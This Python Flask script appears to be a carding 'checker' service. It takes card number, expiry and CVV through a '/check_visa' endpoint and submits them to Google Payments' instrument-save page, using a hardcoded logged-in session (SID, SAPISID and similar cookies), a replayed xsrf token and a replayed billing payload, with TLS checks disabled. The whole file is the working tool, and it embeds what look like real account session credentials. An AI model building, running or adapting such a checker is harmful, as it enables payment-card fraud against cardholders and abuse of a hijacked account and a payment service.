from flask import Flask, request, jsonify
import requests
import urllib3
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

def extract_arabic_text(text):
    arabic_pattern = re.compile(r'[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]+')
    matches = arabic_pattern.findall(text)
    return ' '.join(matches) if matches else "لا يوجد نص عربي في الاستجابة"

@app.route('/check_visa', methods=['GET'])
def check_visa():
    visa_data = request.args.get('visa')
    
    if not visa_data:
        return jsonify({'error': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    try:
        card_number, month, year, cvv = visa_data.split('|')
    except ValueError:
        return jsonify({'error': 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    cookies = {
        'OTZ': '8178671_44_48_171240_44_319500',
        '__Secure-ENID': '28.SE=PTeBA7BBHK3_SWp8A8QwkyWQ0NV2M6jrKe4lof9MMpzxuICErWtDvATtFm8rd7U0aB9yGNxZ2IMXzWRtIEIUkioKphf4htJA97i0z7zmJpFdJDGz_Cu0LuTfmIvOuPfAO9PoSmjDcSglULgqp1EtEktt0JCd2Y6DpQMXh9DAuDhkHeYs_Om9WJOx5ZYM--O_IlAUF5En',
        'AEC': 'AVh_V2heWGGWR6RJaCA3moYCqStgFwI4jiCbc15w80TlB4YShHtN3EFoH7M',
        'NID': '525=ikO_se4-1r-FYmWnCcNNAtdDGChW-nZpocwBnz1oVOo4CnXpYC_JmmXTzUbo1j8k6Hcd-C2m_fDyr_sqJqGBPniwnOQdNyj2To8Zs7ZNyDhqJuW1iVVY71GuqSbgdXEVUf1PqcpEnyxIMhspDyLzlLaFFkV3xC6p7UtpBYcS9z8WXM4dCtlPc51DtxWDXU-AGnVCGngSK3YoWPlauUFPDzkkmu4yA5q4ZA9otV4ehKGN7gJwUbd7IuDpa1RYcXzWXacJjebE3Bv3ShnDFtPGJw7IRi5CZ5ZQWpF82wMCX1Eg4ezjNjeEJLsL94w8KziSHNVHYt-FYUyQo_taQGUlqhUr7CE2vfrK4jcYcwzi0uS_18yvhe01NDjRjyb_D6gBsy_agImx_n5QQ2RSPdgKQFhuNLbuRTrAJbnj212FbMlNELf20C2jbC6QcWtks5k42W9ZFPg4P1gSE-dBw0PwPPGkWthwlMWoJFneE4ND3hc2uBqMFKlln_ImLag2MWkPmeTzDjmdHKmegwYDKmSb21hdw96qQbwF5uTXhKMXOVKbVJXIlwoXSQwNWhSMK2rwF1jIBZCtKymygKTfIy4T0XpMZruE48nZeRMqW-WlQ2N1B-4YeRtwKzF0C-OBDmHIpL5a3NQ4tDtE0etR-UbKmlPgnKJHQ_ZyQc_1sVDePBrI0xyxcYsHfL1TGL2YSJDvnbqdWXOqU3Ln1DFWqb7bRuf93LGsl62UBsjUn0lPsJq2NNLunNAMdxJ0vqVR2Tsf3Yj0SXzm6bHkYOZ6PD05EZrVEyRGvHLr_Lg8zLGm6ikn2ITENAHfVy0J99eZoJrEH5oSnRq7KlX03gSRLhsaaOyU_wpr9wiDwyRWWKSIy9UkOcGG2RhxKp4HcHqfCgNiSzMwb3dbBsD4bfYCWVIz_3hwHjG98ypih-49tKgYQBHYDDfFdgzgiDb8iHSpIDdDN7p13ZUhMAnj7Ow15iaKKFaGM5CIFoTsHO-DBwVgDTDP9XwXMrP8zq5_BFZC6IR6AmAN6QOybVF5345rN82ElDOXs-3UXDQXbax5KC2254hDbStvgcR-L3H9-Hgk0Pvygd_n9w5Otx6buaEShVhn6SEC-BMvpZyvmSxHao5SYMIzk15Obmo7NSjGwGnJZpUV-49kBlj43g_-3GftQjDEDRmJxwo5k3Ofzzb2j0b9EYHgC9gewSnkiZFs_AOCmY21zGolvxVFmRReD__hE8vy7GY4Gu3XU-vVSPZaQfe3-BLLs8bQMip4c-InfRu4b-VfwdxMQhz8gaY-XERDN1u3X6iDSjHWZ374fb06Pe2WIYXlIYGH9S1tmv4JX6ve4cOomqz5de9hlMY6Nf1IroIYjIZkuFLXVf6l20Co3mjcZobEuBkSxhZ3UKCLz6AbuLVT_XnTHuUB_cxCeqNUZYPRsctB1upIIBlJvd8S6TZdYY8aCpwdTp_BTw6PLCg',
        '__utma': '207539602.2100594883.1742201890.1754402052.1754405992.18',
        '__utmc': '207539602',
        '__utmz': '207539602.1754405992.18.18.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        'SID': 'g.a000zwiGj06BhkhVqEo5BYRuh_VJLlGFwHjQWESKm5mPlz9Cs5OFm9NUpoLD3RVSrcmadKZoEAACgYKASQSARYSFQHGX2MiPBizAyRYaHFpAu249zuMJxoVAUF8yKpRaVk1Oeqz8H8e2lbMNe5w0076',
        '__Secure-1PSID': 'g.a000zwiGj06BhkhVqEo5BYRuh_VJLlGFwHjQWESKm5mPlz9Cs5OFmjZUKdm5wPv5TYrWcMvZ3wACgYKAQkSARYSFQHGX2MiMkDcVTieV5aD_kYkOct4BBoVAUF8yKp1mcvZTjvs0A5WV8j_MddJ0076',
        '__Secure-3PSID': 'g.a000zwiGj06BhkhVqEo5BYRuh_VJLlGFwHjQWESKm5mPlz9Cs5OFDLMKsJI-tK-lD078Nft8UQACgYKARcSARYSFQHGX2MiF4b_zhtdA_lHtEeVmYUdJhoVAUF8yKoSDW7_gb2NmW9rMIWMwn2S0076',
        'HSID': 'AX6vHCdlWDXn1kD2Y',
        'SSID': 'AKlXKIQsKBjNCh6-f',
        'APISID': '36DHgD9_2ik0HEZ0/ALpzk4sI6Km3OgybG',
        'SAPISID': 'l36_yvuIn4OioL92/AE6do6fxgQaZuFUMB',
        '__Secure-1PAPISID': 'l36_yvuIn4OioL92/AE6do6fxgQaZuFUMB',
        '__Secure-3PAPISID': 'l36_yvuIn4OioL92/AE6do6fxgQaZuFUMB',
        '__utmt': '1',
        '__utmb': '207539602.13.8.1754407192237',
        'S': 'billing-ui-v3=tVkoyDRSGA4hKFFqCvum6PlHAbQKnG9c:billing-ui-v3-efe=tVkoyDRSGA4hKFFqCvum6PlHAbQKnG9c',
        'SIDCC': 'AKEyXzWCMsZS6Xl11aGYsxWxz5Iv6pEA2Wu9mwtyAbVtHhsue16A93HKViV4kD5YsoaJrzlzXw',
        '__Secure-1PSIDCC': 'AKEyXzVqApz35_o_RlJUvd71hK0AfdUeUutM9HQFDvtt6S-kctAChLI06zo7GEP-3xlZfP7zCTI',
        '__Secure-3PSIDCC': 'AKEyXzVwYgR8ZKbzNbS75qqg2zNIqSTLWvBO4nBFsU-IDa67Y6TVhlcO0kUmUKOuXVD8WxWUTCM',
    }

    headers = {
        'authority': 'payments.google.com',
        'accept': '*/*',
        'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://payments.google.com',
        'referer': 'https://payments.google.com/payments/u/1/embedded/instrument_manager?tc=96%2C87&wst=1754407183515&cst=1754407189299&si=3046999268453971&pet&sri=2&hmi=false&ipi=1503s6ad0qgc&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_hjw70g4ies90&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByCmn9iv1Acg9acEYgDAAgD4AwE%3D&spul=499&cori=https%3A%2F%2Fwallet.google.com',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"137.0.7337.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"SM-A307FN"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-client-data': 'CIOJywE=',
        'x-requested-with': 'XmlHttpRequest',
    }

    params = {
        'ait': 'GAIA',
        'cn': '$p_hjw70g4ies90',
        'eo': 'https://wallet.google.com',
        'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
        'ipi': '1503s6ad0qgc',
        'hl': 'ar',
        'mm': 'e',
        'origin': 'https://wallet.google.com',
        'si': '3046999268453971',
        'style': ':m2',
        'cst': '1754407189299',
        'wst': '1754407183515',
        's7e': '3.1.0.0;3.1.0.1',
        'rt': 'j',
        's': '2',
    }

    data = {
        'xsrf': 'AJWlU2NxhQe3Ka1yz8tf8i_1doDvY3wfKw:1754407191289',
        '3.1.0.0': card_number,
        '3.1.0.1': cvv,
        'msg': '[[null,"ACo329zTQ5TpBRBmEeLR8v43kYvMuAzAQEa4XFP6+33dblefvzOUwz0uxazEntAksE70TDpdHDBUeBNJ/kKAthIlNvyENYf5JRF/yhdQBdaGgHNOvLW6UsF/OWoIay9+dQJFU3l8mhzWmB9cmHjR07u2KTX1radF66ekQmUO68i4+3+6c7w/cVWmBISWWErojcAZrDcmgNKR1sddjBtPLPCwf4c/Q1TrGxefFzHnAKPU8E4R7gV/lRdD3RTvlcy/pP49OuvThyx6",null,[null,[null,null,null,["!2Nul24PNAAavhfsHj4VCaLZQg7DYebs7ADQBEArZ1AjMZXkm97LE98cM8JWMX6D-g7aqasLG00FM7P8MCOENzKAbyxxgHRlYfLQVjpztAgAABSJSAAAALGgBB34ATOOASM1rJKXuZHMD91T0CCK7yEY3Q8P52CMbHsM9vl7zcYpCGTMCLJ5O95hmoHVfMs1g7G0kzbAYjn6FBQaJ89AWM6t0-W5DflnxB62ZB3rx5jKtkLPNL7XujLmr5YP64TuxWZSVihxyBCe1uUTNvsQRXDSCyxn_wrl8ox0YnwFnt6k7bJ3OJgCeuygjiHjeBbxRn5HbLHGnWbhPwakfI_MJPQZYNhwGXl6MsdrD9h26LGljQfJ7qAe54ZukTTr0ksfsMs7Dw5SS4uUOBa7JxAGKabWFiu0tygGn5U9mAzKV_qwxeaHdZTaZk6Dn3PONxhax7OzCyxaiCdo2RhVFzQH0ixkRP3k2QNjn1Vwx7ZK4S1VCQ4w5zJusOEy0sjPZj1CslWls1p3YjKK3S9itVk_LwW051WvN7VUvzAYNiISl6-nWjvgeQXU9gzxJgimFdahEwIyP_zng5tw5G8zMx6rN6AWmfouDk-xOEk2leANDQ959WQQfMosP6oHub3I1C0voTe7CrRqLk33GsVaRH-Y90DfmxyRzKsAS5y7b4WHm1_Ph3ca-N42uR-d3aVLrp34OTIuvCFvAtpRZ5mAwWlawHVlTIGd0p-UB8nKHy2O2svlsyQ5M_Txme0DBQPDoqNHvThGlFcrnmC6ZCMvjQ0OBOrzu4tVdWSjK5n3wyBBDfQGJ5LbnvvE16FEhWyHunUQdwp8Ex8vCCh50CCSR9YgglOevV1rB7SoW9cifiymuGC9sCgVi2Q8jpm_2xrkMvzy9aeq2HXaRKmueVGoBpVhgS9ubHKAEQlTcuDpngUXIsTEcyMBwOKPxWRXorFmZE62CmUjrcFyLQ9FiDBX9AQdhSV96-nZiFIJvaotFubKbZP4eWjSMcpys68lI4itHSeOL0SKNv_cad2n234GFb7rgWF4CcNViS1TqvjiYR_0CiE8srLkNMB5PMyHuFnANHS35TQuklQxRLo8DE00alxEjNF-NEAPTaDg6soY6rn6k6ZqceO9kbdCpmxXzw3MTJY5tRGpFLt7HPY6Wc-qneKQVfuoHjiuBdpmc6Nv2GHSHw9ePztA2CY6Wwp7SMZjdUmIV7VhIlINlRwagrll0efbL7KKG_oFpwb9WHGAGgp5ciWOyReP40scpiFp1Gan8LJ3b_2Mx5KQRPZcObU5kSO5RwEIChqYjF90vGxpqzGS-VLTuFskkgLdXegi-iFR_YPgVKoDQ4ZGrdZlwLrAnzEe-C0QNBRWa5DHQ8h09EZgWpTasTf8m0b9Zfs-yd6Sdml73KRWHqSB-iZSNR98tUcJ52h6N3j8BABoTyO1zlVk438aDaMQ-QJeO-6cbDeX2YKsuqzLINxIp0hxKbc6DqW7UsX6cxIQkvK7Ey1VEDiLfxUzhhmVIZsvkCjtoDvHYfbQts-YZqiqlVhaU0m7oyws6FhcmYMz197hTSS8qOEic8HQ8OBNOp7KBhioLUcBBqzSutZnOtKO2oxOC9Gt2x7mwMJhzVnK6newfbsbwQ7N86IDhgWYNdB7LytKhKxqEk9TtMGlM0sxrGYRiIDm89tuGZsxTzkEnnpCZMiIkWF5mcOcTjL5p_usOVaO7Rr2l-pwIio8H2WmRzav4ZbRG5Wew-gw05cLBpIn9ZLfgcL_zzCvdY_Vvcp-DiivHxQcAHswASaVYnkW3aavthphgP0a30pUXrPnS2L6XOcKwRg25YqH3JBYtZuJVq456va_P19Wl4Q4eFob4-D9IX7r-N0L155LdU0WItgs-qVJo5gzsRxqS_ZEFA9WbML5JFpLWjFtFplMt2YzgAjwe7hhxcAJNK37BUBWgu6G5T6vo7HHGY_ddVU4-kNHc-Nxcf48rncqQq_o-YEGwh54QQdgr4Um1lLuZIAGrauKlfPePoN9X_Fh-nWE4Iubep58S3YeCT3M60WuhNOKvJOTMWE33i_181ZMhzzx5XLfJ4849atiPSxAI0kO4671mfqtnzKfwqNG2TDUbASJ2QItTsjAcuCjX_dMbuFPDrX4VvRmLA8ug4NnoA4XpyU3rUButx3sm76_4ZYUMTJdLwQQSITujj-N21upvkQpGONWi-GKiEdevF7yrQ0Upqvrl5NFwPHxhvK45OXb5sD9Xg5HRF04mVlsMe_YpKte5XVaf5wqX22Y3jKiDIAltJq_DvxWgGs9dOzaYUOWggIWQyQPRxCopvjOHWv6YzpmjGO59_PBwVq603IIw9OwTqSU-yxw0UqSvyctNRbkgJpGBj6ZVXHenTH7LjUauZW9zhGjcTSpMKOMGMIFxExmvLCmSZVsYsaD_Fz047mUahskPBPhAbkvMC3a9iTvcI5yn3k7afJP3lUv4_xDkcaTKRaddqfmXvl4Ma5hFn0CQyksfwCctC8e8psgpugCxZnX3MnWH1uy-yp0PKO6WEWTPwtSYVsPa5A3IlkvPAFC7JgzMKChk-_dUP3kRhvlXhScSouEYe20iW_VaDWZGyuJKOfBKFjwMHv1tV5S_Gc-eKAmjqIp5kR_hIFY-cVuD-UYBbp5ah9_ZulVEnD_jykvsmHTLBf9rmiospRx2P4tPwqE4HEvIWE8DbZ2w3O8E-mINRXU-7eLRLINqvzlu22_QdA_ECYg7DjZykb4d_8nQ9kkaEsnuEtGcuZL9KLBZKnwuJlY"]]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",9,2026,null,"3680",null,"__s7e_data__61bb463a","Mr cnn",[["US",null,"TX",null,"Plano",null,null,null,null,null,null,"75074",null,["098 Fairwood Village","Oisoddn"]],null,null,null,"billingAddress",null,"CggIxLmJwwIQAQ==",2001],"CAEQAxogEgJVUxoDVVNEMAhAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,1,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,2,e8,7bdb49f6,0,95,b6540200,0,140,eea820b6,0,236,1aa4331,0,"Linux armv81,f54683f2,1,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,0,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,1,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,0,6:a21,3,1987ad1423e,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2b1:a40,"f,1987ad144ef,"n,0,0,"t,1987ad13b9c,0,0,0,0,1987ad13ba8,1987ad13ba8,1987ad13ba8,1987ad13ba8,1987ad13ba8,0,1987ad13bb8,1987ad13f72,1987ad13f95,1987ad13f95,1987ad1425f,1987ad1425f,1987ad145c7,1987ad14802,1987ad14803,1987ad14835:a10:a31,3,"h,1,"p,74,43,"m,1249,1198,707,2138'
    }

    try:
        time.sleep(2)
        session = requests.Session()
        session.verify = False
        session.headers.update(headers)
        
        response = session.post(
            'https://payments.google.com/efe/payments/u/1/instrument_manager_save_page',
            params=params,
            cookies=cookies,
            data=data,
            timeout=15,
            allow_redirects=True
        )
        
        arabic_content = extract_arabic_text(response.text)
        
        return jsonify({
            'status_code': response.status_code,
            'content': arabic_content
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            'error': str(e),
            'message': 'تحت صيانة'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
